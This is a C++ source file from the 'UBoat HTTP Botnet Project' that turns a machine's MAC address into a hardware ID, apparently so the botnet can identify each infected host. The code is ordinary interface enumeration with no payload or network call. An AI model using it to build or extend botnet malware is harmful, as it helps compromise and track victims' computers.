/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#include <cstring>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>

#include <ifaddrs.h>
#include <net/if_dl.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <unistd.h>

#include "OSHwidChecker.h"

std::string print_uuid(uint64_t ab, uint64_t cd)
{
    std::stringstream ss;
    ss << std::hex << std::nouppercase << std::setfill('0');

    uint32_t a = (uint32_t)(ab >> 32);
    uint32_t b = (uint32_t)(ab & 0xFFFFFFFF);
    uint32_t c = (uint32_t)(cd >> 32);
    uint32_t d = (uint32_t)(cd & 0xFFFFFFFF);

    ss << std::setw(8) << (a) << '-';
    ss << std::setw(4) << (b >> 16) << '-';
    ss << std::setw(4) << (b & 0xFFFF) << '-';
    ss << std::setw(4) << (c >> 16) << '-';
    ss << std::setw(4) << (c & 0xFFFF);
    ss << std::setw(8) << d;

    return ss.str();
}

bool get_mac_address(std::vector<unsigned char>& _node)
{
    struct ifaddrs* ifaphead;
    int rc = getifaddrs(&ifaphead);
    if (rc)
        return false; // cannot get network adapter list

    bool foundAdapter = false;
    for (struct ifaddrs* ifap = ifaphead; ifap; ifap = ifap->ifa_next) {
        if (ifap->ifa_addr && ifap->ifa_addr->sa_family == AF_LINK) {
            struct sockaddr_dl* sdl = reinterpret_cast<struct sockaddr_dl*>(ifap->ifa_addr);
            caddr_t ap = (caddr_t)(sdl->sdl_data + sdl->sdl_nlen);
            int alen = sdl->sdl_alen;
            if (ap && alen > 0) {
                _node.resize((unsigned char)alen);
                std::memcpy(_node.data(), ap, _node.size());
                foundAdapter = true;
                break;
            }
        }
    }
    freeifaddrs(ifaphead);
    if (!foundAdapter)
        return false; // cannot determine MAC address (no suitable network adapter found)

    return true;
}

bool getHwid(char* str, int bufferSize)
{
    std::vector<unsigned char> node;

    if (!get_mac_address(node)) {
        std::cout << "cannot determine MAC address (no suitable network adapter found)" << std::endl;
        return false;
    }

    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    node.resize(6);
    for (unsigned i = 0; i < 6; ++i)
        ss << std::setw(2) << int(node[i]);
    uint64_t t;

    if (! (ss >> t))
        return false;

    std::string macAddr = print_uuid(UBOAT_UUID_PREFIX, t);
    strncpy(str, macAddr.c_str(), bufferSize);

    return true;
}
